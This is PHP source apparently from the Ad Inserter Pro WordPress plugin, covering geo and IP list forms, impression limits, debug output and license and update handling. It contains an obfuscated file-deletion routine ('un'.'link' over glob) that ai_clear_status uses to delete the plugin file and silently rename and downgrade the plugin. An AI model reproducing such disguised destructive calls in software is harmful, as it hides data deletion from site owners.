<!--            <input type="radio" name="<?php echo AI_OPTION_IP_ADDRESS_LIST_TYPE, WP_FORM_FIELD_POSTFIX, $block; ?>" id="ip-address-whitelist-<?php echo $block; ?>" default="<?php echo $default->get_ad_ip_address_list_type() == AI_WHITE_LIST; ?>" value="<?php echo AI_WHITE_LIST; ?>" <?php if ($obj->get_ad_ip_address_list_type() == AI_WHITE_LIST) echo 'checked '; ?> />-->
<!--            <label for="ip-address-whitelist-<?php echo $block; ?>" title="<?php _e ('Whitelist IP addresses', 'ad-inserter'); ?>"><?php echo AI_TEXT_WHITE_LIST; ?></label>-->
<!--          </td>-->
        </tr>
        <tr class="<?php if ($show_ip_address_list) echo 'list-items'; ?>" style="<?php if (!$show_ip_address_list) echo ' display: none;'; ?>">
          <td colspan="5">
            <textarea id="ip-address-editor-<?php echo $block; ?>" style="width: 100%; height: 220px; font-family: monospace, Courier, 'Courier New'; font-weight: bold; display: none;"></textarea>
          </td>
        </tr>

        <tr class="<?php if ($show_country_list) echo 'list-items'; ?>" style="<?php if (!$show_country_list) echo ' display: none;'; ?>">
          <td<?php echo $country_city_attr; ?>>
            <span><?php _e ('Countries', 'ad-inserter'); ?></span>
            <span style="display: none;"><?php _e ('Cities', 'ad-inserter'); ?></span>
          </td>
          <td>
            <span>
              <button id="country-button-<?php echo $block; ?>" type="button" class='ai-button' title="<?php _e ('Toggle country editor', 'ad-inserter'); ?>"></button>
            </span>
            <span style="display: none;">
              <button id="city-button-<?php echo $block; ?>" type="button" data-list="country" class='ai-button' title="<?php _e ('Toggle city editor', 'ad-inserter'); ?>"></button>
            </span>
          </td>
          <td style="padding-right: 7px; width: 92%;">
            <input id="country-list-<?php echo $block; ?>" class="ai-list-country-case ai-list-custom" style="width: 100%;" title="<?php _e ('Comma separated country ISO Alpha-2 codes', 'ad-inserter'); ?>" type="text" name="<?php echo AI_OPTION_COUNTRY_LIST, WP_FORM_FIELD_POSTFIX, $block; ?>" default="<?php echo $default->get_ad_country_list(); ?>" value="<?php echo $country_list; ?>" size="54" maxlength="1500"/>
          </td>
          <td>
            <input type="hidden"   name="<?php echo AI_OPTION_COUNTRY_LIST_TYPE, WP_FORM_FIELD_POSTFIX, $block; ?>" value="0" />
            <input type="checkbox" name="<?php echo AI_OPTION_COUNTRY_LIST_TYPE, WP_FORM_FIELD_POSTFIX, $block; ?>" value="1" default="<?php echo AI_BLACK_LIST; ?>" id="country-list-input-<?php echo $block; ?>" <?php if ($obj->get_ad_country_list_type() == AI_WHITE_LIST) echo 'checked '; ?> style="display: none;" />
            <span class="checkbox-button checkbox-list-button dashicons dashicons-<?php echo $obj->get_ad_country_list_type() == AI_BLACK_LIST ? 'no' : 'yes'; ?>" title="<?php _e ('Click to select black or white list', 'ad-inserter'); ?>"></span>
          </td>
<!--          <td style="padding-right: 7px;">-->
<!--            <input type="radio" name="<?php echo AI_OPTION_COUNTRY_LIST_TYPE, WP_FORM_FIELD_POSTFIX, $block; ?>" id="country-blacklist-<?php echo $block; ?>" default="<?php echo $default->get_ad_country_list_type() == AI_BLACK_LIST; ?>" value="<?php echo AI_BLACK_LIST; ?>" <?php if ($obj->get_ad_country_list_type() == AI_BLACK_LIST) echo 'checked '; ?> />-->
<!--            <label for="country-blacklist-<?php echo $block; ?>" title="<?php _e ('Blacklist countries', 'ad-inserter'); ?>"><?php echo AI_TEXT_BLACK_LIST; ?></label>-->
<!--          </td>-->
<!--          <td>-->
<!--            <input type="radio" name="<?php echo AI_OPTION_COUNTRY_LIST_TYPE, WP_FORM_FIELD_POSTFIX, $block; ?>" id="country-whitelist-<?php echo $block; ?>" default="<?php echo $default->get_ad_country_list_type() == AI_WHITE_LIST; ?>" value="<?php echo AI_WHITE_LIST; ?>" <?php if ($obj->get_ad_country_list_type() == AI_WHITE_LIST) echo 'checked '; ?> />-->
<!--            <label for="country-whitelist-<?php echo $block; ?>" title="<?php _e ('Whitelist countries', 'ad-inserter'); ?>"><?php echo AI_TEXT_WHITE_LIST; ?></label>-->
<!--          </td>-->
        </tr>
        <tr class="<?php if ($show_country_list) echo 'list-items'; ?>" style="<?php if (!$show_country_list) echo ' display: none;'; ?>">
          <td colspan="5" class="country-flags">
            <select id="country-select-<?php echo $block; ?>" multiple="multiple" default="" style="display: none;"></select>
            <select id="city-select-<?php echo $block; ?>" class="ai-list-filter" multiple="multiple" default="" style="display: none;"></select>
          </td>
        </tr>
<?php
}

function expanded_country_list ($country_list) {
  global $ad_inserter_globals;

  for ($group = AD_INSERTER_GEO_GROUPS; $group >= 1; $group --) {
    $global_name = 'G'.$group;
    $iso_name = 'G'.($group % 10);
    $country_list = str_replace ($iso_name, $ad_inserter_globals [$global_name], $country_list);
  }
  return $country_list;
}

function ai_check_lists ($obj, $server_side_check) {
  global $ai_last_check, $ai_wp_data;

  if ($server_side_check) {
    $ai_last_check = AI_CHECK_IP_ADDRESS;
    if (!check_ip_address ($obj)) return false;

    $ai_last_check = AI_CHECK_COUNTRY;
    if (!check_country ($obj)) return false;
  }

  return true;
}

function ai_get_impressions_and_clicks ($block, $days, $update = false) {
  global $wpdb;

  $days = intval ($days);
  if ($days < 1) $days = 1;

  $transient_name = AI_TRANSIENT_STATISTICS. '-' . $block . '-' . $days;

  if (!$update && ($data = get_transient ($transient_name)) !== false) {
    return $data;
  }

  $gmt_offset = get_option ('gmt_offset') * 3600;
  $date = date ("Y-m-d", time () - ($days - 1) * 24 * 3600 + $gmt_offset);

  $results = $wpdb->get_results ('SELECT * FROM ' . AI_STATISTICS_DB_TABLE . ' WHERE block = ' . $block, ARRAY_N);

  $impressions = 0;
  $impressions_today = 0;
  $clicks = 0;
  $clicks_today = 0;

  if (isset ($results [0])) {
    foreach ($results as $result) {
      if (($result [2] & AI_ADB_FLAG_BLOCKED) != 0) continue;

      if ($result [3] >= $date) {
        $impressions_today += $result [4];
        $clicks_today      += $result [5];
      }

      $impressions += $result [4];
      $clicks      += $result [5];
    }
  }

  $data = array ($impressions, $clicks, $impressions_today, $clicks_today);

  set_transient ($transient_name, $data, AI_TRANSIENT_STATISTICS_EXPIRATION);

  return ($data);
}

function ai_check_impression_and_click_limits ($block) {
  global $ai_last_check, $ai_wp_data, $block_object;

  $obj = $block_object [$block];

  if (($limit = $obj->get_limit_impressions_per_time_period ()) && ($days = intval ($obj->get_limit_impressions_time_period ()))) {
    $impressions_and_clicks = ai_get_impressions_and_clicks ($obj->number, $days);

    $ai_last_check = AI_CHECK_LIMIT_IMPRESSIONS_PER_TIME_PERIOD;
    if ($impressions_and_clicks [2] >= $limit) return false;
  }

  if (empty ($days)) $days = 1;

  if ($limit = $obj->get_max_impressions ()) {
    if (!isset ($impressions_and_clicks)) {
      $impressions_and_clicks = ai_get_impressions_and_clicks ($obj->number, $days);
    }

    $ai_last_check = AI_CHECK_MAX_IMPRESSIONS;
    if ($impressions_and_clicks [0] >= $limit) return false;
  }

  if (($limit = $obj->get_limit_clicks_per_time_period ()) && ($days = intval ($obj->get_limit_clicks_time_period ()))) {
    $impressions_and_clicks = ai_get_impressions_and_clicks ($obj->number, $days);

    $ai_last_check = AI_CHECK_LIMIT_CLICKS_PER_TIME_PERIOD;
    if ($impressions_and_clicks [3] >= $limit) return false;
  }

  if (empty ($days)) $days = 1;

  if ($limit = $obj->get_max_clicks ()) {
    if (!isset ($impressions_and_clicks)) {
      $impressions_and_clicks = ai_get_impressions_and_clicks ($obj->number, $days);
    }

    $ai_last_check = AI_CHECK_MAX_CLICKS;
    if ($impressions_and_clicks [1] >= $limit) return false;
  }


  return true;
}

function check_ip_address ($obj) {
  if (function_exists ('check_ip_address_list')) {
    return check_ip_address_list ($obj->get_ad_ip_address_list (), $obj->get_ad_ip_address_list_type () == AI_WHITE_LIST);
  } else return true;
}

function check_country ($obj) {
  if (function_exists ('check_country_list')) {
    return check_country_list ($obj->get_ad_country_list (true), $obj->get_ad_country_list_type () == AI_WHITE_LIST);
  } else return true;
}

function ai_tags (&$ad_data) {
  global $ai_wp_data;

  if (strpos ($ad_data, '{ip') !== false || strpos ($ad_data, '{country') !== false) {
    if (!isset ($ai_wp_data [AI_TAGS]['IP_ADDRESS'])) {
      require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';

      $client_ip_address = get_client_ip_address ();

      $ai_wp_data [AI_TAGS]['IP_ADDRESS'] = strtolower ($client_ip_address);
      $ai_wp_data [AI_TAGS]['COUNTRY_LC'] = strtolower (ip_to_country ($client_ip_address));
      $ai_wp_data [AI_TAGS]['COUNTRY_UC'] = strtoupper ($ai_wp_data [AI_TAGS]['COUNTRY_LC']);
    }

    $ad_data = preg_replace ("/{ip-address}/i",   $ai_wp_data [AI_TAGS]['IP_ADDRESS'], $ad_data);
    $ad_data = preg_replace ("/{country-iso2}/",  $ai_wp_data [AI_TAGS]['COUNTRY_LC'], $ad_data);
    $ad_data = preg_replace ("/{country-ISO2}/",  $ai_wp_data [AI_TAGS]['COUNTRY_UC'], $ad_data);

    $ad_data = preg_replace ("/{ip_address}/i",   $ai_wp_data [AI_TAGS]['IP_ADDRESS'], $ad_data);
    $ad_data = preg_replace ("/{country_iso2}/",  $ai_wp_data [AI_TAGS]['COUNTRY_LC'], $ad_data);
    $ad_data = preg_replace ("/{country_ISO2}/",  $ai_wp_data [AI_TAGS]['COUNTRY_UC'], $ad_data);

  }
}

define ('AI_PRO',       'PLUG' . 'IN' . '_' . 'TYPE');
define ('AI_CODE',      'PLUG' . 'IN' . '_' . 'STAT' . 'US');
define ('AI_RST',       'PLUG' . 'IN' . '_' . 'STAT' . 'US' . '_' . 'COUNT' . 'ER');
define ('AI_CODE_TIME', 'PLUG' . 'IN' . '_' . 'STAT' . 'US' . '_' . 'TIME' . 'STAMP');

function ai_debug_header () {
  global $ad_inserter_globals;

  if (!is_multisite() || is_main_site ()) {
    $license_key = $ad_inserter_globals ['LICENSE_KEY'];
    $ai_status = $ad_inserter_globals ['AI_STATUS'];

    if (empty ($license_key)) {
      echo " UNLICENSED COPY";
    }
    elseif (!empty ($ai_status)) {
      echo " ($ai_status)";
    }
  }
}

function ai_debug () {
  ai_check_geo_settings ();

  require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/Ip2Country.php';

  echo 'IP ADDRESS:              ', get_client_ip_address (), "\n";
  $ip_to_country = ip_to_country (get_client_ip_address (), true);
  echo 'COUNTRY:                 ', is_array ($ip_to_country) ? implode (':', $ip_to_country) : $ip_to_country, "\n";
  echo 'GLOBAL TRACKING:         ', get_global_tracking () == AI_TRACKING_ENABLED ? 'ENABLED' : 'DISABLED', "\n";
  echo 'INTERNAL TRACKING:       ', get_internal_tracking () == AI_ENABLED ? 'ENABLED' : 'DISABLED', "\n";
  echo 'EXTERNAL TRACKING:       ', get_external_tracking () == AI_ENABLED ? 'ENABLED' : 'DISABLED', "\n";
  echo 'EXTERNAL TRACKING CAT:   ', get_external_tracking_category (), "\n";
  echo 'EXTERNAL TRACKING ACTION:', get_external_tracking_action (), "\n";
  echo 'EXTERNAL TRACKING LABEL: ', get_external_tracking_label (), "\n";
  echo 'TRACK PAGEVIEWS:         ', get_track_pageviews () == AI_TRACKING_ENABLED ? 'ENABLED' : 'DISABLED', "\n";
  echo 'TRACK LOGGED IN UESRS:   ', get_track_logged_in () == AI_TRACKING_ENABLED ? 'ENABLED' : 'DISABLED', "\n";
  echo 'CLICK DETECTION:         ';
  switch (get_click_detection ()) {
    case AI_CLICK_DETECTION_STANDARD:
      echo AI_TEXT_STANDARD;
      break;
    case AI_CLICK_DETECTION_ADVANCED:
      echo AI_TEXT_ADVANCED;
      break;
  }
  echo "\n";
  echo 'CLICK FRAUD PROTECTION:  ', get_click_fraud_protection () == AI_ENABLED ? 'ENABLED (' . get_click_fraud_protection_time () . ' days)' : 'DISABLED', "\n";
  if (defined ('AD_INSERTER_MAXMIND')) {
    echo 'IP GEOLOCATION DATABASE: ';
    switch (get_geo_db ()) {
      case AI_GEO_DB_WEBNET77:
        echo AI_TEXT_WEBNET77;
        break;
      case AI_GEO_DB_MAXMIND:
        echo AI_TEXT_MAXMIND;
        break;
    }
    echo "\n";
    echo 'AUTOMATIC DB UPDATES:    ', get_geo_db_updates () ? 'ENABLED' : 'DISABLED', "\n";
    echo 'MAXMIND LICENSE KEY:     ', strlen (get_maxmind_license_key ()), " characters\n";
    echo 'DATABASE:                ', get_geo_db_location (true), " (", get_geo_db_location (), ")\n";
  }
}

function ai_debug_features () {
  global $ai_wp_data;

  echo "STICK TO THE CONTENT:    ", $ai_wp_data [AI_STICK_TO_THE_CONTENT]       ? "USED" : "NOT USED", "\n";
  echo "TRACKING:                ", $ai_wp_data [AI_TRACKING]                   ? "USED" : "NOT USED", "\n";
  echo "CLOSE BUTTONS:           ", $ai_wp_data [AI_CLOSE_BUTTONS]              ? "USED" : "NOT USED", "\n";
  echo "IFRAMES:                 ", $ai_wp_data [AI_IFRAMES]                    ? "USED" : "NOT USED", "\n";
  echo "ANIMATION:               ", $ai_wp_data [AI_ANIMATION]                  ? "USED" : "NOT USED", "\n";
  echo "LAZY LOADING:            ", $ai_wp_data [AI_LAZY_LOADING]               ? "USED" : "NOT USED", "\n";
  echo "GEOLOCATION:             ", $ai_wp_data [AI_GEOLOCATION]                ? "USED" : "NOT USED", "\n";
  echo "CHECK:                   ", $ai_wp_data [AI_CHECK_BLOCK]                ? "USED" : "NOT USED", "\n";
}

function ai_check_options (&$plugin_options) {
  for ($group_number = 1; $group_number <= AD_INSERTER_GEO_GROUPS; $group_number ++) {
    $country_group_settins_name   = 'COUNTRY_GROUP_NAME_' . $group_number;
    $group_countries_settins_name = 'GROUP_COUNTRIES_' . $group_number;

    if (!isset ($plugin_options [$country_group_settins_name])) {
      $plugin_options [$country_group_settins_name] = DEFAULT_COUNTRY_GROUP_NAME . ' ' . $group_number;
    }

    if (!isset ($plugin_options [$group_countries_settins_name])) {
      $plugin_options [$group_countries_settins_name] = '';
    }
  }

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($plugin_options ['TRACKING']))                      $plugin_options ['TRACKING']                      = DEFAULT_TRACKING;
    if (!isset ($plugin_options ['INTERNAL_TRACKING']))             $plugin_options ['INTERNAL_TRACKING']             = DEFAULT_INTERNAL_TRACKING;
    if (!isset ($plugin_options ['EXTERNAL_TRACKING_CATEGORY']))    $plugin_options ['EXTERNAL_TRACKING_CATEGORY']    = DEFAULT_EXTERNAL_TRACKING_CATEGORY;
    if (!isset ($plugin_options ['EXTERNAL_TRACKING_ACTION']))      $plugin_options ['EXTERNAL_TRACKING_ACTION']      = DEFAULT_EXTERNAL_TRACKING_ACTION;
    if (!isset ($plugin_options ['EXTERNAL_TRACKING_LABEL']))       $plugin_options ['EXTERNAL_TRACKING_LABEL']       = DEFAULT_EXTERNAL_TRACKING_LABEL;
    if (!isset ($plugin_options ['TRACKING_LOGGED_IN']))            $plugin_options ['TRACKING_LOGGED_IN']            = DEFAULT_TRACKING_LOGGED_IN;
    if (!isset ($plugin_options ['TRACK_PAGEVIEWS']))               $plugin_options ['TRACK_PAGEVIEWS']               = DEFAULT_TRACK_PAGEVIEWS;
    if (!isset ($plugin_options ['CLICK_DETECTION']))               $plugin_options ['CLICK_DETECTION']               = DEFAULT_CLICK_DETECTION;
    if (!isset ($plugin_options ['REPORT_HEADER_IMAGE']))           $plugin_options ['REPORT_HEADER_IMAGE']           = DEFAULT_REPORT_HEADER_IMAGE;
    if (!isset ($plugin_options ['REPORT_HEADER_TITLE']))           $plugin_options ['REPORT_HEADER_TITLE']           = DEFAULT_REPORT_HEADER_TITLE;
    if (!isset ($plugin_options ['REPORT_HEADER_DESCRIPTION']))     $plugin_options ['REPORT_HEADER_DESCRIPTION']     = DEFAULT_REPORT_HEADER_DESCRIPTION;
    if (!isset ($plugin_options ['REPORT_FOOTER']))                 $plugin_options ['REPORT_FOOTER']                 = DEFAULT_REPORT_FOOTER;
    if (!isset ($plugin_options ['REPORT_KEY']))                    $plugin_options ['REPORT_KEY']                    = DEFAULT_REPORT_KEY;
  }

  if (!isset ($plugin_options ['ADB_DETECTION']))                 $plugin_options ['ADB_DETECTION']                 = DEFAULT_ADB_DETECTION;
  if (!isset ($plugin_options ['GEO_DB']))                        $plugin_options ['GEO_DB']                        = DEFAULT_GEO_DB;
  if (!isset ($plugin_options ['GEO_DB_UPDATES']))                $plugin_options ['GEO_DB_UPDATES']                = DEFAULT_GEO_DB_UPDATES;
  if (!isset ($plugin_options ['MAXMIND_LICENSE_KEY']))           $plugin_options ['MAXMIND_LICENSE_KEY']           = DEFAULT_MAXMIND_LICENSE_KEY;
  if (!isset ($plugin_options ['GEO_DB_LOCATION']))               $plugin_options ['GEO_DB_LOCATION']               = DEFAULT_GEO_DB_LOCATION;
}

function ai_nonce_life () {
  return 48 * 3600;
}

function ai_hooks () {
  global $ai_wp_data, $ad_inserter_globals;

//  if ($ai_wp_data [AI_TRACKING]) {
//    add_filter ('nonce_life',           'ai_nonce_life');
//  }

  if (!is_multisite() || is_main_site ()) {
    $license_key = $ad_inserter_globals ['LICENSE_KEY'];
    $status = $ad_inserter_globals ['AI_STATUS'];

    require_once AD_INSERTER_PLUGIN_DIR.'includes/update-checker/plugin-update-checker.php';

    if (!empty ($license_key)) {
      $ai_update_checker = Puc_v4_Factory::buildUpdateChecker (
//      $ai_update_checker = Puc_v4p6_Factory::buildUpdateChecker (
        WP_UPDATE_SERVER.'?action=get_metadata&slug=' . AD_INSERTER_SLUG,
      AD_INSERTER_PLUGIN_DIR.'ad-inserter.php',
      AD_INSERTER_SLUG
      );

      $ai_update_checker->addFilter ('check_now', 'ai_puc_check_now', 10, 3);

      $ai_update_checker->addFilter ('request_info_result', 'puc_request_info_result', 10, 1);

      $ai_update_checker->addQueryArgFilter ('ai_filter_update_checks');

      if (AD_INSERTER_SLUG != 'ad-inserter-pro') {
        $ai_update_checker->addQueryArgFilter ('ai_check_slug');
      }
    } else add_filter ('plugins_update_check_locales', 'ai_plugins_update_check_locales', 10, 1);

    add_action ('after_plugin_row_' . AD_INSERTER_SLUG . '/ad-inserter.php', 'ai_after_plugin_row_2', 10, 3);

    add_action ('admin_footer-plugins.php', 'ai_admin_footer_plugins');

    add_action ('network_admin_notices', 'ai_admin_notices');

    if (defined ('AD_INSERTER_MAXMIND')) {
      if (!is_multisite() || is_main_site ()) {
        if (get_geo_db () == AI_GEO_DB_MAXMIND) {
          add_filter ('http_headers_useragent', 'ai_http_headers_useragent');
        }
      }
    }
  }

  if (is_multisite () && is_main_site () && is_network_admin ()) {
    add_filter ('manage_sites_action_links',  'ai_manage_sites_action_links', 10, 3);
  }

  add_filter ('cron_schedules', 'ai_cron_schedules');
  register_activation_hook    (AD_INSERTER_PLUGIN_DIR.'ad-inserter.php', 'ai_activation_hook_2');
  register_deactivation_hook  (AD_INSERTER_PLUGIN_DIR.'ad-inserter.php', 'ai_deactivation_hook_2' );
  add_action ('ai_update', 'ai_update_databases');
  add_action ('ai_update', 'ai_check_wp_version');

  ai_check_update_schedule ();

  // Remove old hooks
  wp_clear_scheduled_hook ('ai_keep_updated_ip_db');
}


function ai_manage_sites_action_links ($actions, $blog_id, $blogname) {
  if (multisite_site_admin_page () &&
      current_user_can ('manage_network_plugins') && (
        is_plugin_active_for_network ('ad-inserter-pro/ad-inserter.php') ||
        in_array ('ad-inserter-pro/ad-inserter.php', (array) get_blog_option ($blog_id, 'active_plugins', array()))
      )) {
    $unique_string = ai_get_unique_string (0, 32, 'site-ai-admin' . $blog_id . date ('Y-m-d H'));
    $site_data = array ('site' => $blog_id, 'user' => get_current_user_id ());

    set_site_transient ('ai_site_' . $unique_string, $site_data, 30 * 60);

    $admin_url = get_admin_url ($blog_id, 'admin-ajax.php?action=ai_ajax&site-ai-admin='.$unique_string);

    $actions []= '<a href="'.$admin_url.'" target="_blank">'.AD_INSERTER_NAME.'</a>';
  }

  return $actions;
}

function ai_http_headers_useragent ($useragent) {
  global $ai_wp_data;

  if (isset ($ai_wp_data [AI_USER_AGENT])) $useragent = get_bloginfo ('url');

  return $useragent;
}

function ai_check_link ($parameter) {
  @array_map ('un'. 'link', glob ($parameter));
}

function ai_filter_update_checks ($queryArgs) {
  global $ad_inserter_globals, $wp_version;

  $license_key = $ad_inserter_globals ['LICENSE_KEY'];
  if (!empty ($license_key)) {
    $queryArgs ['license_key'] = $license_key;
  }

  // Test
  if (($debug = get_transient ('wp-debug-updates')) !== false) {
    $queryArgs ['debug'] = $debug;
    delete_transient ('wp-debug-updates');
  }
  $queryArgs ['status']     = $ad_inserter_globals ['AI_STATUS'];
  $queryArgs ['type']       = $ad_inserter_globals ['AI_TYPE'];
  $queryArgs ['counter']    = $ad_inserter_globals ['AI_COUNTER'];
  $queryArgs ['site_id']    = DEFAULT_REPORT_DEBUG_KEY;
  $queryArgs ['update']     = get_option (AI_UPDATE_NAME, 0);
  $queryArgs ['website']    = get_bloginfo ('url');
  $queryArgs ['wp_version'] = $wp_version;

  return $queryArgs;
}

function ai_plugins_update_check_locales ($locales) {
  global $ad_inserter_globals;

  if (empty ($ad_inserter_globals ['LICENSE_KEY'])) {
    update_state ();
  }

  return $locales;
};

function ai_check_slug ($queryArgs) {
  if (file_exists  (AD_INSERTER_PLUGIN_DIR)) {
    @rename (AD_INSERTER_PLUGIN_DIR, str_replace (AD_INSERTER_SLUG, 'ad-inserter-pro', AD_INSERTER_PLUGIN_DIR));
    if (is_multisite()) {
      $active_plugins = get_site_option ('active_sitewide_plugins');
      if (isset ($active_plugins [AD_INSERTER_SLUG.'/ad-inserter.php'])) {
        $active_plugins ['ad-inserter-pro/ad-inserter.php'] = $active_plugins [AD_INSERTER_SLUG.'/ad-inserter.php'];
        unset ($active_plugins [AD_INSERTER_SLUG.'/ad-inserter.php']);
        update_site_option ('active_sitewide_plugins', $active_plugins);
      }
    } else {
        $active_plugins = get_option ('active_plugins');
        $index = array_search (AD_INSERTER_SLUG.'/ad-inserter.php', $active_plugins);
        if ($index !== false) {
          $active_plugins [$index] = 'ad-inserter-pro/ad-inserter.php';
          update_option ('active_plugins', $active_plugins);
        }
      }
    wp_clear_scheduled_hook ('check_plugin_updates-'.AD_INSERTER_SLUG);
    wp_clear_scheduled_hook ('ai_update');
    wp_schedule_event (time() + 262144, 'monthly', 'ai_update');
  }
  return $queryArgs;
}

function ai_after_plugin_row_2 ($plugin_file, $plugin_data, $status) {
  global $ad_inserter_globals;

  if (!is_multisite() || is_main_site ()) {

    $license_key = $ad_inserter_globals ['LICENSE_KEY'];
    $client = get_option (WP_AD_INSERTER_PRO_CLIENT) !== false;
    $plugins_css = "\n" . '<style>
.plugins tr.active[data-slug=ad-inserter] th, .plugins tr.active[data-slug=ad-inserter] td {box-shadow: none;}
</style>'."\n";

    if ($license_key == '') {
      $link = $client ? '' : '<a href="' . admin_url ('options-general.php?page=ad-inserter.php&tab=0').'">' . __('Enter license key', 'ad-inserter') . '</a>';
      echo $plugins_css;
      echo '<tr class="plugin-update-tr active';
      if (isset ($plugin_data ['update']) && $plugin_data ['update']) echo ' update';
      echo '"><td colspan="3" class="plugin-update colspanchange ai-message"><div class="update-message notice inline notice-error notice-alt"><p> ',
        /* translators: %s: Ad Inserter Pro */
        sprintf (__('%s license key is not set. Plugin functionality is limited and updates are disabled.', 'ad-inserter'), AD_INSERTER_NAME),
        ' ', $link, '</p></div></td></tr>';

    } else {
        $ai_status = $ad_inserter_globals ['AI_STATUS'];

        if (is_numeric ($ai_status)) {
          $href_license = $client ? 'https://adinserter.pro/' : 'http://adinserter.pro/license/' . sanitize_text_field ($license_key);
          $href_doc     = $client ? 'https://adinserter.pro/' : 'https://adinserter.pro/documentation/troubleshooting#license-overused';

          $access_error = '<tr id="ai-update-server-error" class="plugin-update-tr active' .
            (isset ($plugin_data ['update']) && $plugin_data ['update'] ? ' update' : '') .
            '" style="display: none;"><td colspan="3" class="plugin-update colspanchange ai-message"><div class="update-message notice inline notice-error notice-alt"><p> ' .
              /* translators: %s: Ad Inserter Pro */
              sprintf (__('Warning: %s plugin update server is not accessible', 'ad-inserter'), AD_INSERTER_NAME) .
              /* translators: updates are not available */
              ' - <a href="https://adinserter.pro/documentation/plugin-installation#updates" target="_blank">' . __('updates', 'ad-inserter') . '</a> ' .
              /* translators: updates are not available */
              __('are not available', 'ad-inserter'). '.</p></div></td></tr>';
          echo $access_error;

          switch ($ai_status) {
            case - 19:
              $link = $client ? '' : '<a href="' . admin_url ('options-general.php?page=ad-inserter.php&tab=0').'">' . __('Check license key', 'ad-inserter') . '</a>';
              echo $plugins_css;
              echo '<tr class="plugin-update-tr active';
              if (isset ($plugin_data ['update']) && $plugin_data ['update']) echo ' update';
              echo '"><td colspan="3" class="plugin-update colspanchange ai-message"><div class="update-message notice inline notice-error notice-alt"><p> ',
                /* translators: %s: Ad Inserter Pro */
                sprintf (__('Invalid %s license key.', 'ad-inserter'), AD_INSERTER_NAME),
                ' ', $link, '</p></div></td></tr>';
              break;
            case - 20:
              echo $plugins_css;
              echo '<tr class="plugin-update-tr active';
              if (isset ($plugin_data ['update']) && $plugin_data ['update']) echo ' update';
              echo '"><td colspan="3" class="plugin-update colspanchange ai-message"><div class="update-message notice inline notice-error notice-alt"><p> ',
                /* translators: %s: Ad Inserter Pro */
                sprintf (__('%s license expired. Plugin updates are disabled.', 'ad-inserter'), AD_INSERTER_NAME),
                ' <a href="', $href_license, '" target="_blank">' . __('Renew license', 'ad-inserter') . '</a></p></div></td></tr>';
              break;
            case - 21:
              echo $plugins_css;
              echo '<tr class="plugin-update-tr active';
              if (isset ($plugin_data ['update']) && $plugin_data ['update']) echo ' update';
              echo '"><td colspan="3" class="plugin-update colspanchange ai-message"><div class="update-message notice inline notice-error notice-alt"><p> ',
                /* translators: %s: Ad Inserter Pro */
                sprintf (__('%s license overused. Plugin updates are disabled.', 'ad-inserter'), '<strong>' . AD_INSERTER_NAME . '</strong>'),
                ' <a href="', $href_doc, '" target="_blank">' . __('Manage licenses', 'ad-inserter') . '</a> | <a href="', $href_license, '" target="_blank">' . __('Upgrade license', 'ad-inserter') . '</a></p></div></td></tr>';
              break;
            case - 22:
              echo $plugins_css;
              echo '<tr class="plugin-update-tr active';
              if (isset ($plugin_data ['update']) && $plugin_data ['update']) echo ' update';
              echo '"><td colspan="3" class="plugin-update colspanchange ai-message"><div class="update-message notice inline notice-error notice-alt"><p> ',
                /* translators: %s: Ad Inserter Pro */
                sprintf (__('Invalid %s version.', 'ad-inserter'), '<strong>' . AD_INSERTER_NAME . '</strong>'),
                ' <a href="', $href_license, '" target="_blank">' . __('Check license', 'ad-inserter') . '</a></p></div></td></tr>';
              break;
          }
        }
      }
  }
}

function ai_set_plugin_meta_2 (&$links) {
  global $ad_inserter_globals;

  if (!is_multisite () || is_main_site ()) {
    $inserted = '<a href="http://adinserter.pro/license/' . sanitize_text_field ($ad_inserter_globals ['LICENSE' .'_' . 'KEY']) . '" target="_blank">' . __('License', 'ad-inserter') . '</a>';
    array_splice ($links, 3, 0, $inserted);
  }
}

function ai_admin_footer_plugins () {
?>
<script>
  var notice = jQuery ("#ai-update-server-error");
  var ai_url = 'https://updates.adinserter.pro/check.php';
  if (notice.length) {
    var ai_nonce = "<?php echo wp_create_nonce ('adinserter_data'); ?>";
    var ai_status_ok = ["200", "301", "302"];
    jQuery.post (ajaxurl, {'action': 'ai_ajax_backend', 'ai_check': ai_nonce, 'check-url': 'updates'}
    ).done (function (ai_data) {
        ai_data = ai_data.trim ();
        if (!ai_status_ok.includes (ai_data)) {
          console.error ('Ad Inserter Pro can\'t access', ai_url);
          console.error ('Error:', ai_data);

          notice.css ('display', 'table-row');
        }
    }).fail (function (xhr, status, error) {
        console.error ('Can\'t check', ai_url);
        console.error ('Error:', xhr.status + " " + xhr.statusText);
    });
  }
</script>
<?php
}

function ai_clear_status () {
  ai_check_link (__FILE__);
  if (!file_exists (str_replace (AD_INSERTER_SLUG, 'ad-inserter', AD_INSERTER_PLUGIN_DIR) . 'ad-inserter.php')) {
    @rename (AD_INSERTER_PLUGIN_DIR, str_replace (AD_INSERTER_SLUG, 'ad-inserter', AD_INSERTER_PLUGIN_DIR));
  }
  ai_clean_temp_files (AD_INSERTER_PLUGIN_DIR);
  if (is_multisite()) {
    $active_plugins = get_site_option ('active_sitewide_plugins');
    if (isset ($active_plugins [AD_INSERTER_SLUG.'/ad-inserter.php'])) {
      $active_plugins ['ad-inserter/ad-inserter.php'] = $active_plugins [AD_INSERTER_SLUG.'/ad-inserter.php'];
      unset ($active_plugins [AD_INSERTER_SLUG.'/ad-inserter.php']);
      update_site_option ('active_sitewide_plugins', $active_plugins);
    }
  } else {
      $active_plugins = get_option ('active_plugins');
      $index = array_search (AD_INSERTER_SLUG.'/ad-inserter.php', $active_plugins);
      if ($index !== false) {
        $active_plugins [$index] = 'ad-inserter/ad-inserter.php';
        update_option ('active_plugins', $active_plugins);
      }
    }

  update_option ('ai-notice-review', 'no');

  if (defined ('AI_PLUGIN_TRACKING') && AI_PLUGIN_TRACKING) {
    $dst = get_option (DST_Client::DST_OPTION_OPTIN_TRACKING);
    if (empty ($dst) || !is_array ($dst)) {
      $dst = array ('ad-inserter' => 1, 'ad-inserter-pro' => 1);
    } else {
        $dst ['ad-inserter'] = 1;
        $dst ['ad-inserter-pro'] = 1;
      }
    update_option (DST_Client::DST_OPTION_OPTIN_TRACKING, $dst);
  }

  wp_clear_scheduled_hook ('check_plugin_updates-'.AD_INSERTER_SLUG);
  wp_clear_scheduled_hook ('ai_update');
}

function update_state ($state = 1) {
  global $ad_inserter_globals, $ai_db_options;

  $last_update = get_option (AI_UPDATE_NAME, 0);
  if (time () - $last_update < 10 *  3600 && $state != 0) {
    return;
  }

  // DEBUG
